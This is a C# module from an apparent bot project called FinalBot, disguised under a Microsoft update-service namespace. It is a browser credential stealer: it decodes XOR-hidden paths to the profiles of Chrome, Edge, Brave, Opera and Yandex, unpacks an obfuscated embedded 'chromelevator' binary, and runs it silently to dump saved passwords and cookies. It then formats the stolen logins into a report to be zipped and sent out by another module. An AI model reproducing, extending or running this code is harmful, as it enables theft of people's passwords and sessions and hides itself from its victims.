using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;
using Microsoft.Data.Sqlite;
using FinalBot;

namespace Microsoft.UpdateService.Modules
{
    public class DataService
    {
        private static string D(string s)
        {
            char[] c = s.ToCharArray();
            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
            return new string(c);
        }

        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private readonly Dictionary<string, string> _browserPaths = new Dictionary<string, string>
        {
            {"Chrome", D("Bjjbi`YFmwjh`YPv`w%Adqd")},
            {"Edge", D("HlfwjvjcqY@ab`YPv`w%Adqd")},
            {"EdgeBeta", D("HlfwjvjcqY@ab`%G`qdYPv`w%Adqd")},
            {"Brave", D("Gwds`Vjcqrdw`YGwds`(Gwjrv`wYPv`w%Adqd")},
            {"Opera", D("Ju`wd%Vjcqrdw`YJu`wd%Vqdgi`")},
            {"Opera GX", D("Ju`wd%Vjcqrdw`YJu`wd%B]%Vqdgi`")},
            {"Yandex", D("Ydka`}YYdka`}Gwjrv`wYPv`w%Adqd")}
        };

        public async Task<string> RunAll()
        {
            var reports = new List<string>();
            try 
            {
                // 1. Run Chromelevator bypass for all browsers
                await RunChromelevator();

                // 2. Process the results folder
                string outputDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc", "VOutput");
                if (Directory.Exists(outputDir))
                {
                    string rawPass = Path.Combine(outputDir, "passwords.txt");
                    string prettyPass = Path.Combine(outputDir, "passwords_formatted.txt");
                    
                    if (File.Exists(rawPass))
                    {
                        GeneratePrettyFile(rawPass, prettyPass);
                        reports.Add("✅ **Browser passwords captured and formatted.**");
                    }
                    
                    if (File.Exists(Path.Combine(outputDir, "cookies.txt")))
                    {
                        reports.Add("🍪 **Browser cookies captured successfully.**");
                    }
                    
                    // The actual sending of the files will be handled by ReportManager/CommandHandler 
                    // who will ZIP the entire VOutput folder.
                }
                else 
                {
                    reports.Add("❌ Browser extraction failed: No output folder found.");
                }
            }
            catch (Exception ex)
            {
                reports.Add($"❌ Critical error in browser service: {ex.Message}");
            }
            
            return string.Join("\n", reports);
        }

        private async Task RunChromelevator()
        {
            try
            {
                string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);

                string elevatorPath = Path.Combine(tempDir, "chromelevator.exe");
                string outputDir = Path.Combine(tempDir, "VOutput");
                if (Directory.Exists(outputDir)) Directory.Delete(outputDir, true);
                Directory.CreateDirectory(outputDir);

                if (!File.Exists(elevatorPath))
                {
                    var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                    using Stream? stream = assembly.GetManifestResourceStream("FinalBot.chromelevator.bin");
                    if (stream == null) return;
                    
                    using MemoryStream ms = new MemoryStream();
                    stream.CopyTo(ms);
                    byte[] bytes = ms.ToArray();
                    for(int i = 0; i < bytes.Length; i++) bytes[i] ^= 0xAA;
                    File.WriteAllBytes(elevatorPath, bytes);
                }

                var proc = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = elevatorPath,
                        Arguments = $"all --method nt -o \"{outputDir}\"", 
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                await proc.WaitForExitAsync();
            }
            catch (Exception ex)
            {
                Logger.Error("Chromelevator execution failed", ex);
            }
        }

        private static void GeneratePrettyFile(string inputFile, string outputFile)
        {
            try
            {
                var lines = File.ReadAllLines(inputFile);
                var passwords = new List<PasswordEntry>();
                
                for (int i = 0; i < lines.Length; i += 4)
                {
                    if (i + 2 >= lines.Length) break;
                    
                    passwords.Add(new PasswordEntry {
                        Url = lines[i].Replace("domain ", "").Trim(),
                        User = lines[i+1].Replace("log ", "").Trim(),
                        Pass = lines[i+2].Replace("pass ", "").Trim()
                    });
                }

                var grouped = passwords.GroupBy(p => ExtractDomain(p.Url)).OrderBy(g => g.Key);
                
                using (StreamWriter sw = new StreamWriter(outputFile, false, Encoding.UTF8))
                {
                    sw.WriteLine("═══ 💎 BROWSER PASSWORDS REPORT 💎 ═══");
                    sw.WriteLine();
                    
                    foreach (var group in grouped)
                    {
                        sw.WriteLine("🌐 DOMAIN: " + group.Key.ToUpper());
                        foreach (var p in group)
                        {
                            sw.WriteLine("  👤 Login: " + p.User);
                            sw.WriteLine("  🔑 Password: " + p.Pass);
                            sw.WriteLine("  🔗 Link: " + p.Url);
                            sw.WriteLine();
                        }
                        sw.WriteLine(new string('═', 30));
                    }
                }
            }
            catch { }
        }

        private static string ExtractDomain(string url)
        {
            if (string.IsNullOrEmpty(url)) return "UNKNOWN";
            try
            {
                if (!url.Contains("://")) url = "http://" + url;
                Uri uri = new Uri(url);
                string host = uri.Host;
                if (host.StartsWith("www.")) host = host.Substring(4);
                return host.ToUpper();
            }
            catch { return url.ToUpper(); }
        }

        private class PasswordEntry
        {
            public string Url { get; set; } = "";
            public string User { get; set; } = "";
            public string Pass { get; set; } = "";
        }
    }
}
    }
}
